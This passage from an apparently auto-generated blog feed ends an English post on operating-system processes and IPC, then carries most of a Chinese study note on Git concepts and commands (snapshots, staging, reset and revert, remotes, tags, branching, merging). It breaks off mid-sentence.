communication is allowed, is it half duplex or full duplex?</li><li>Must a relationship (such as <strong><em>parent-child</em></strong>) exist between the communicating processes?</li><li>Can the pipes communicate over a network, or must the processes reside on the same machine?</li></ol><hr><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><ul><li><a href="https://www.geeksforgeeks.org/difference-between-shared-memory-model-and-message-passing-model-in-ipc/">https://www.geeksforgeeks.org/difference-between-shared-memory-model-and-message-passing-model-in-ipc/</a></li><li><a href="https://www.geeksforgeeks.org/process-control-block-in-os/">https://www.geeksforgeeks.org/process-control-block-in-os/</a></li><li><a href="https://en.wikipedia.org/wiki/Message_passing">https://en.wikipedia.org/wiki/Message_passing</a></li><li><em>Operating System Concept, 9th edition</em></li><li>ChatGPT-4o</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;key-objectives&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#key-objectives&quot;&gt;&lt;/a&gt; Key objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn the notion wof a proc</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Git二周目学习</title>
    <link href="http://example.com/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-02T13:17:15.501Z</published>
    <updated>2024-12-03T06:27:42.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>上半年搭建完博客后初步了解了一下 git 的常用指令，第一次了解 git 这个版本控制工具，之后又零零散散地通过不同慕课和视频（<em><a href="https://www.bilibili.com/video/BV1x7411H7wa/?spm_id_from=333.999.0.0">Missing semester</a></em>，<a href="https://www.bilibili.com/video/BV1Bu4y1K7yr/?spm_id_from=333.999.0.0">南大 ICS</a>和<a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.999.0.0">技术蛋老师</a>）重温，可是我发现在学习过程中并没有很深入地去了解 git 的相关概念和具体操作之间的关系，实际使用中还涉及与远端仓库的交互，因此在做实验时总是搞得一团乱麻 (screw up)。学艺不精最终在实践中带来恶果，其中种种因缘和合且按下不表。最终我在痛定思痛后决心开启新周目的 git 学习，希望能真正地<strong>了解</strong>git，以后遇到问题不至于连 CSDN 的解决方法都看不懂。</p><h1 id="学习内容"><a class="markdownIt-Anchor" href="#学习内容"></a> 学习内容</h1><p>这次的学习的参考资料主要是 <em>Pro Git</em>，并且注重学习其中的具体概念。本篇博文会补充在一周目博文中没有记录的 command，同时通过具体实操例子来阐述 git 的概念与操作。</p><blockquote><p>… , because if you understand what Git is and the fundamentals of how it works, then using Git effectively will probably be much easier for you. —— <em>Pro Git</em></p></blockquote><h1 id="什么是-git"><a class="markdownIt-Anchor" href="#什么是-git"></a> 什么是 Git</h1><h2 id="使用-snapshot-而非-δ"><a class="markdownIt-Anchor" href="#使用-snapshot-而非-δ"></a> 使用 snapshot 而非 Δ</h2><p>git 和其他 VCS (Version Control System)最大的区别就在于它们是如何对待 (think of)数据的。</p><p>绝大部分的 VCS 存储的文件以及不同版本间对这些文件进行的修改 (<strong><em>delta-based</em></strong> version control)。Store data as a series of <strong>changesets</strong>。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/changes.png" alt="changes.png"><br>相较之下，git 认为数据是一个微型文件系统中的一系列快照 (snapshot)。Store data as a series of <strong>snapshots</strong>.</p><blockquote><p>Git thinks about its data more like a <strong>stream of snapshots</strong>.<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/snapshot.png" alt="snapshot.png"></p></blockquote><h2 id="commit-与-snapshot"><a class="markdownIt-Anchor" href="#commit-与-snapshot"></a> commit 与 snapshot</h2><blockquote><p><strong>When you make a commit, Git stores a commit object that contains a pointer to the snapshot of the content you staged.</strong> This object also contains the author’s name and email address, the message that you typed, and pointers to the commit or commits that directly came before this commit (its parent or parents): zero parents for the initial commit, one parent for a normal commit, and multiple parents for a commit that results from a merge of two or more branches.</p></blockquote><p>snapshot 是一种当前项目状态的一种抽象，实际上我们的 fies 以树的形式 (tree object)存储在 repo 中。我们提交到 repo 中的 commit 包含一些元数据 ([[#^ce9b5c|meta data]])以及一个指向树的根节点的指针。</p><blockquote><p>Staging the files computes a checksum for each one, stores that version of the file in the Git repository (Git refers to them as <em>blobs</em>), and adds that checksum to the staging area.</p><p>When you create the commit by running git commit, Git checksums each subdirectory and stores them as a <strong>tree object</strong> in the Git repository. Git then creates a commit object that has the metadata and a pointer to the root project tree so it can re-create that snapshot when needed.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/commit_tree.png" alt="commit_tree.png"></p><h2 id="git-的数据完整性"><a class="markdownIt-Anchor" href="#git-的数据完整性"></a> Git 的数据完整性</h2><p>所有记录在 git 中的数据都会使用哈希算法 (SHA-1)进行检验和处理，然后才根据哈希值将数据记录在 git 中，这也意味着不可能在不被 git 记录的情况下修改其中的文件。–&gt; integrity</p><blockquote><p>You can’t lose information in transit or get file corruption without Git being able to detect it.</p></blockquote><h2 id="三种-git-追踪的文件状态重要"><a class="markdownIt-Anchor" href="#三种-git-追踪的文件状态重要"></a> 三种 git 追踪的文件状态（重要）</h2><p>git 追踪 (tracking)的文件有三种状态：<em>modified, staged and committed</em></p><ul><li><em>modified</em> 意味着对文件做了修改但是还没有 commit 到数据库 (local or remote)中</li><li><em>staged</em> 意味着标记已修改的文件并且可以 commit 其当前版本</li><li><em>committed</em> 指文件已经安全地存储在了本地数据库中<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/status.png" alt="status.png"><br>三种状态也对应着三个概念：<em>working tree, staging area and Git repository</em></li><li><u>The working tree is a single checkout of one version of the project. </u>These files are pulled out of the <strong>compressed</strong> database in the Git directory and placed on disk for you to use or modify.</li><li><u>The staging area is a file, generally contained in your Git directory</u>, that stores information about what will go into your next commit.</li><li><u>The Git directory is where Git stores the <b>metadata</b> and object database</u> for your project. This is the most important part of Git, and <strong>it is what is copied when you clone a repository from another computer.</strong> (ps: 文中所说的&quot;metadata&quot;可以理解为对数据的存放、访问、处理等操作的规则，可以联想 HTML 的&lt;head&gt;中的&lt;meta&gt; tag，以及类比于磁盘管理中的 MBR) ^ce9b5c</li></ul><p>基于这三种状态，我们可以运行一条标准（常见）的工作流：</p><ol><li>在当前的工作目录下修改文件</li><li>通过<code>add</code>来选择性地将文件加入到暂存区中，准备提交</li><li>将暂存区的文件提交到本地仓库，并且永久地记录下它的快照（记住我们是通过 hash value 来对 snapshot 进行唯一标识的）</li></ol><h1 id="git-基础"><a class="markdownIt-Anchor" href="#git-基础"></a> Git 基础</h1><h2 id="tracked-staged-and-untracked"><a class="markdownIt-Anchor" href="#tracked-staged-and-untracked"></a> Tracked, Staged and Untracked</h2><p>前面说“git 追踪的文件有三种状态”，其中追踪就是指 tracked，顾名思义 git 能够知道文件是否做了更改 (changes)。<u>实际上，git 目录下的文件只有两种状态，tracked or untracked</u>。对于 untracked files 来说，我们通过<code>git add</code>来将它们推到暂存区中，此时的 snapshot 加入了此次变动，所以它们<strong>暂时</strong>也是 staged 状态（当然也是 tracked）。但是如果我们对它们进行修改，那么这些 tracked 文件的修改会被 git 追踪，但并没有将 changes 更新到 staging area 的 snapshot 中，所以此时我们 commit 的话将是把未更新的 snapshot 永久记录在 git log 中。为了更新 snapshot 中的文件版本，我们在修改后还需要<code>git add</code>重新 staging。</p><blockquote><p>Untracked basically means that Git sees a file you didn’t have in the previous snapshot (commit), and which hasn’t yet been staged.</p><p><code>git add</code> is a multipurpose command — you use it to begin <strong>tracking new files</strong>, to <strong>stage files</strong>, and to do other things like marking merge-conflicted files as resolved. It may be helpful to think of it more as “<u>add precisely this content to the next commit</u>” rather than “add this file to the project”.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_status.png" alt="git_status.png"></p><h2 id="ignoring-files"><a class="markdownIt-Anchor" href="#ignoring-files"></a> Ignoring Files</h2><p>有时候我们的工作目录中会有一些我们不想提交的文件，例如编译中间过程产生的<code>.o</code>文件、日志等，而它们又总是会出现在<code>Untracked files</code>下，为了让 git 忽略它们，我们可以创建一个<code>.gitignore</code>隐藏文件。<code>.gitignore</code>中写的是你需要忽略的文件名，当然可以使用通配符 (glob pattern)的形式。下面是一个例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> .gitignore</span></span><br><span class="line">*.[oa]</span><br><span class="line">*~</span><br><span class="line">a.txt</span><br><span class="line">build/</span><br><span class="line">!hello.o</span><br></pre></td></tr></table></figure><h2 id="git-diff"><a class="markdownIt-Anchor" href="#git-diff"></a> git diff</h2><blockquote><p>you’ll probably use it most often to answer these two questions: <strong>What have you changed but not yet staged? And what have you staged that you are about to commit?</strong></p></blockquote><p>不同于<code>git status</code>只给出哪些文件做了修改，<code>git diff</code>能更详细地给出文件中增加或删除的文本行，这些是做了修改但是含没有暂存的文件。我们知道，<code>git diff</code>比较的是<u>工作目录下的文件和暂存区中的文件</u>，所以记得要在修改后要更新 snapshot，才会更新文件的 version。<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diff.png" alt="diff.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git diff --staged</span></span><br></pre></td></tr></table></figure><p>加上 option<code>--staged</code>则会比较暂存区文件和上一次 commit 的区别，注意看<code>hello.cc</code>文件的版本是还没有更新的，还是暂存区中的旧版本。<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diff_staged.png" alt="diff_staged.png"><br>要注意，<code>git diff</code>这个命令本身只比较修改后的 unstaged 文件和 staged 文件间的区别，而不会显示它们与上一次 commit 的区别！</p><h2 id="git-rm"><a class="markdownIt-Anchor" href="#git-rm"></a> git rm</h2><p><code>git rm</code>将文件从 working directory 中删除，同时 stage changes。在下图的情况中，如果我们此时 commit，那么 history 中的 snapshot 将不再有<code>hello</code>文件，但是<code>b.txt</code>还是存在的，因为 git 并没有记录该文件的改变 (deletion)。</p><blockquote><p>You can pass files, directories, and file-glob patterns to the <code>git rm</code> command.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_rm.png" alt="git_rm.png"><br>既然<code>git add</code>可以使文件 untracked --&gt; tracked，当我们不小心 add 了不希望提交的文件，我们也可以将其从 tracked 状态转变为 untracked 状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">rm</span> --cached filename</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/rm_cached.png" alt="rm_cached.png"></p><h2 id="undoing-things"><a class="markdownIt-Anchor" href="#undoing-things"></a> Undoing Things</h2><h3 id="1-修订上次的提交"><a class="markdownIt-Anchor" href="#1-修订上次的提交"></a> 1. 修订上次的提交</h3><p>如果我们在 commit 后发现有些更改忘记 stage 了，可以加上 option<code>--amend</code>来修正</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;my first commit&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add CNAME.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit --amend</span></span><br></pre></td></tr></table></figure><h3 id="2-将-staged-转为-unstaged"><a class="markdownIt-Anchor" href="#2-将-staged-转为-unstaged"></a> 2. 将 staged 转为 unstaged</h3><p>我们可能通过<code>git add *</code>不小心暂存了我们不想在下次 commit 的文件，为了将其从暂存区中解救出来，需要下面的命令（其实这在 header 中有写）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">showed <span class="keyword">in</span> status bar, better    √</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git restore --staged filename</span></span><br><span class="line">or</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">old version: wrote <span class="keyword">in</span> _Pro git_ ×</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git reset HEAD filename</span></span><br></pre></td></tr></table></figure><p>注意它和上文提到的解除追踪状态 tracked --&gt; untracked 之间的区别！</p><h3 id="3-撤销对文件的修改"><a class="markdownIt-Anchor" href="#3-撤销对文件的修改"></a> 3. 撤销对文件的修改</h3><p>如果要对做了修改的文件进行回退 (unmodify)，可以<code>git restore</code>，当然这也是在 header 中有提示的。<br>不过这个命令还是要慎重使用</p><blockquote><p>It’s important to understand that <code>git restore filename</code> is a dangerous command. Any local changes you made to that file are gone — <strong>Git just replaced that file with the last staged or committed version</strong>.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git restore filename</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/discard.png" alt="discard.png"><br>如果想要保存修改，同时又想让其不显示在 status 中，在 <em>Pro Git, go over stashing and branching</em> 一节中有讲，由于不是很重要，故不在此赘述。</p><blockquote><p>Remember, anything that is <u>committed in Git</u> can almost always be recovered. Even commits that were on branches that were deleted or commits that were overwritten with an <code>--amend</code>commit can be recovered. <strong>However, anything you lose that was never committed is likely never to be seen again.</strong></p></blockquote><h3 id="4回退历史"><a class="markdownIt-Anchor" href="#4回退历史"></a> 4.回退历史</h3><p>讨论了这么多，我们终于迎来了版本控制系统的一个重要的特性：回退 (rewind/roll back/revoke)。在 git 中常用的有两种方式将我们的 working tree 回退到之前的 snapshot 中，分别是<code>reset</code>和<code>revert</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the commmit<span class="string">&#x27;s checksum you want to roll back</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git reset &lt;commit ID&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_reset.png" alt="git_reset.png"><br><code>reset</code>实际通过三步来完成回退（具体可看 <em>Sec 7.7 Git Tools - Reset Demystified</em>），结果是它将完全舍弃 (discard)回退目标点后的所有 commits，同时根据 snapshot 恢复工作目录和<code>HEAD</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ID is</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git revert &lt;commit ID&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/git_revert.png" alt="git_revert.png"><br>同样是回退，但是<code>revert</code>是重置某个特定提交之前对文件所做的所有修改，并且以一个新的 commit 提交到历史中。需要注意的是，<code>revert</code>是恢复指定 commit 之前的状态，而<code>reset</code>是恢复为指定 commit 的状态，略有不同。</p><p>为了安全起见，在撤销有其他开发者工作的 repo 中的修改时，请使用  <code>git revert</code>。</p><h2 id="working-with-remotes"><a class="markdownIt-Anchor" href="#working-with-remotes"></a> Working with Remotes</h2><p>除了在本地的 repo 上工作外，我们还可能需要用到远端仓库来和其他人协作，或者单纯作为本地库的一个备份。一个本地仓库可以联系不同的远端仓库，比如可以选择 Github 托管一个 repo，<s>用 Gitee 托管另一个</s>。</p><blockquote><p>Remote repositories are versions of your project that are hosted on the Internet or network somewhere. You can have several of them, each of which generally is either read-only or read/write for you.</p><p>The word “<strong>remote</strong>” does not necessarily imply that the repository is somewhere else on the network or Internet, only that it is elsewhere.</p></blockquote><h3 id="1-关于-git-clone"><a class="markdownIt-Anchor" href="#1-关于-git-clone"></a> 1. 关于 git clone</h3><p>我们 clone 的仓库是会自己默认联系原本的远端仓库的，所以说我们在刚克隆的仓库下<code>git remote -v</code>查看远端仓库信息时会发现已有<code>origin</code> (或其他 shortname)。我觉得这是因为 commit 到远端仓库的数据是本地仓库的“全部”，所以也会带上 clone 的仓库的信息。</p><blockquote><p>… the <code>git clone</code> command <strong>implicitly</strong> adds the origin remote for you.</p></blockquote><h3 id="2-adding-renaming-and-removing"><a class="markdownIt-Anchor" href="#2-adding-renaming-and-removing"></a> 2. Adding, Renaming and Removing</h3><p>操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">add a remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git remote add &lt;shortname&gt; &lt;URL&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">change a remote<span class="string">&#x27;s shortnam</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git remote rename &lt;fromName&gt; &lt;toName&gt;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">remove a remote</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">git remote remove &lt;shortname&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>关于 rename：It’s worth mentioning that this changes all your remote-tracking branch names, too.<br>关于 remove：Once you delete the reference to a remote this way, all remote-tracking branches and configuration settings associated with that remote are also deleted.</p></blockquote><h2 id="tagging"><a class="markdownIt-Anchor" href="#tagging"></a> Tagging</h2><p>git 能让我们为某些提交打上 tag，以此表明这些提交很重要，例如标记新版本的发布 (v1.0, v2.0)。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lightweighting tag</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag &lt;tagName&gt; (&lt;checksum&gt;)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">annotated tag</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -a &lt;tagName&gt; -m <span class="string">&quot;message&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">delete tag, but not remove from remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -d &lt;tagName&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">variation: remove from remote</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin --delete &lt;tagName&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们要为之前的 commit 打上标签，需要指出需要 tag 的提交的 checksum，否则就默认为最近的一次提交打 tag。<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/tag.png" alt="tag.png"></p><blockquote><p><u>By default, the git push command doesn’t transfer tags to remote servers</u>. You will have to explicitly push tags to a shared server after you have created them. You can run <code>git push origin &lt;tagname&gt;</code>.</p></blockquote><h1 id="git-分支"><a class="markdownIt-Anchor" href="#git-分支"></a> Git 分支</h1><blockquote><p>… , we’ll cover Git’s <strong>killer feature</strong>: its <em>branching model</em>, and it certainly sets Git apart in the VCS community.</p></blockquote><p>在许多 VCS 中要实现分支需要复制一个完整的源代码目录 (source code directory)，在此之上才能进行分支的开发。对于大的工程项目来说，分支无疑会产生巨大的开销。对比之下，git 的 branching model 轻量高效，这也是为什么称之为 “killer feature”。</p><blockquote><p>The way Git branches is incredibly lightweight, making branching operations nearly instantaneous, and switching back and forth between branches generally just as fast.</p></blockquote><p>回顾一下我们对 commit 和 snapshot 的讨论，如果我们有许多 commits，那么它们在一个分支上将形成一个链表（头插入）。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/commit_link.png" alt="commit_link.png"><br>git 上的一个分支只是一个轻量的指针，这也意味这它可以随便移动指向任意的 commit。当我们提交一个 commit 时，branch 指针就会向前移动，指向最新的那个 commit。下图中<code>HEAD</code>指针指示着我们当前所处的分支为<code>master</code>。<br><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/branch_history.png" alt="branch_history.png"></p><h2 id="creating-and-switching-branches"><a class="markdownIt-Anchor" href="#creating-and-switching-branches"></a> Creating and Switching branches</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">just create a new branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create a new branch and switch to it</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">delete a branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -d &lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p>我们创建的分支基于<code>HEAD</code>指针指向的当前分支（也是指针）指向的 commit（看起来有点绕），而且创建完成后并不会自动切换到新分支。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout &lt;branch&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">From Git version 2.23 onwards you can use `git switch` instead of `git checkout`</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git switch &lt;branch&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>git checkout</code>，<u>我们的<code>HEAD</code>指针会指向切换的分支</u>，假设是我基于<code>main</code>分支的最新 commit 创建的<code>diverge</code>分支。我们可以在这个新分支上提交 commit，而原来的<code>main</code>仍然指向开始 diverge 的那个 commit，不会收到新分支的影响。当使用<code>git log</code>查看 commit 历史时，我们发现默认只会显示这个分支的所有提交。</p><ul><li>To show commit history for the desired branch you have to explicitly specify it: <code>git log &lt;branch&gt;</code>.</li><li>To show all of the branches, add <code>--all</code> to your git log command.</li></ul><p>如果此时我们再<code>checkout</code>回原来的分支<code>main</code>，<u>那么当前工作目录下的文件会恢复 (revert)为切换分支指向的 snapshot</u>。</p><blockquote><p>It essentially <strong>rewinds</strong> the work you’ve done in your <code>diverge</code> branch so you can go in a different direction.</p><p>However, before you do that, note that if your working directory or staging area has uncommitted changes that conflict with the branch you’re checking out, Git won’t let you switch branches. <u>It’s best to have a clean working state when you switch branches</u>.</p></blockquote><p><img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/diverge.png" alt="diverge.png"></p><h2 id="basic-branching-and-merging"><a class="markdownIt-Anchor" href="#basic-branching-and-merging"></a> Basic Branching and Merging</h2><p>上面的图显示我在<code>main</code>分支上对<code>c.txt</code>做了修改和 commits，同时在<code>diverge</code>分支上又有对<code>hello.cc</code>做了修改和另一些 commits。此时如果我在<code>diverge</code>分支上的工作已经完成了，想要将<code>diverge</code>合并到<code>main</code>中，需要先切换到<code>main</code>分支，再通过<code>git merge</code>来将目标分支合并到当前分支。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge.png" alt="merge.png"><br>git 使用 <strong>three-way merge</strong>的方法来实现两个分支的合并（有端联想 three-way handshake）。<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/three_way.png" alt="three_way.png"><br>所谓的 tree-way 就是 git 用两个分支指向的 snapshot + 开始 diverge 的节点的 snapshot，一共三个 snapshots，来创建一个新的 snapshot，并且在<code>merge commit</code>提交到 repo 中。可以注意到，这个特殊的 commit 具有两个 parent commits。如果我们不需要再在 merge 完的分支上继续开发，就可以<code>branch -d</code>把分支删了。历史拓扑图如下：<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge_commit.png" alt="merge_commit.png"> ^7f3018</p><h2 id="merge-conflict"><a class="markdownIt-Anchor" href="#merge-conflict"></a> Merge Conflict</h2><p>合并冲突是一件挺头疼的事情，如果工程庞大起来，merge 需要解决的冲突就会变得很多。那么上面实操时为什么没有产生 merge confict 呢？因为两个分支修改的是不同的文件，我们以 common ancestor 的 snapshot 为基准来看两个分支的改动，不就相当于我在同一分支上对不同文件做了修改吗，所以不存在“冲突”。</p><blockquote><p>If you changed the same part of the same file differently in the two branches you’re merging, Git won’t be able to merge them cleanly。</p></blockquote><p>如果两个分支对同一个文件的同一位置做了修改，git 不知道以哪一分支的修改作为最终版本，所以会报错：<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/merge_conflict.png" alt="merge_conflict.png"><br>针对冲突的部分一个个 fix，全部解决后再次提交，完美解决冲突 😄<img src="/2024/10/02/Git%E4%BA%8C%E5%91%A8%E7%9B%AE%E5%AD%A6%E4%B9%A0/fix_confict.png" alt="fix_confict.png"></p><h2 id="branch-management"><a class="markdownIt-Anchor" href="#branch-management"></a> Branch Management</h2><p>查看当前仓库的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch</span></span><br></pre></td></tr></table></figure><p>Option:</p><ul><li><code>--all</code>: 查看本地和远端的所有分支</li><li><code>--merged</code> and <code>--no-merged</code>: 前者列举当前分支所合并了的分支，后者则列举当前分支还没有合并的分支，要指定特定分支可以在最后加上分支名<code>&lt;branch&gt;</code></li></ul><p>修改分支名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch --move &lt;branch&gt; &lt;newName&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rename your current branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -m &lt;newName&gt;</span></span><br></pre></td></tr></table></figure><p>git 的修改分支操作和 Linux 修改文件名一样都是通过<code>move</code>。这里需要注意的是，我们此时修改的只是本地的分支名，还需要同步到远端。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push --set-upstream origin &lt;newName&gt;</span></span><br></pre></td></tr></table></figure><p>同步完成后我们再通过查看所有分支，会发现远端增加了一个新的分支，但旧分支还存在，需要我们手动把它删了。ps: 这里我并不是很理解为什么会出现两个分支，正如前文所说，git 的分支仅是轻量化的指针（最新 commit 的 checksum），既然本地能直接修改名称，为什么远端就不能这么做呢？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin --delete &lt;oldName&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><u>Changing the name of a branch like master/main/mainline/default will break the integrations, services, helper utilities and build/release scripts that your repository uses. </u>Before you do this, make sure you consult with your collaborators. Also, make sure you do a thorough search through your repo and update any references to the old branch name in your code and scripts.</p></blockquote><h2 id="remote-branches"><a class="markdownIt-Anchor" href="#remote-branches"></a> Remote Branches</h2><p>我们知道分支和标签都是指针，或者说是引用 (reference)，关于分支和标签等引用，本地和远端都会分别存储，这也是为什么前文在本地创建和删除 tag 或 branch 后需要通过<code>push</code>来和远端同步。其中本地分支和远端分支之间的联系称为 remote-tracking，在本地通过一个<code>remote-tracking branch</code>来标识最新一次和远端连接时的 branch 状态（<em>Pro 